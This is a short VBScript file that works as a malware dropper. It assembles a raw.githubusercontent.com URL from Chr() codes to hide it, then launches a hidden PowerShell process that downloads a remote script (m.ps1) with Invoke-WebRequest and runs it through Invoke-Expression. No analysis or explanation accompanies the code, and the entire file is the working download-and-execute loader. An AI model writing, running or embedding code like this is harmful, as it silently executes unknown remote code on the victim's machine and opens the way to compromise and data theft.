Option Explicit
Dim a, b, u, s
Set a = CreateObject("WScript.Shell")
u = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115) & Chr(58) & Chr(47) & Chr(47) & "raw.githubusercontent" & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & "k53xupn43" & Chr(47) & "i965652f" & Chr(47) & "refs" & Chr(47) & "heads" & Chr(47) & "main" & Chr(47) & "m.ps1"
s = Chr(36) & "a=" & "IWR " & "'" & u & "';invoke-expression " & Chr(36) & "a"
b = "powershell.exe -c """ & s & """"
a.Run b, 0, True
Set a = Nothing
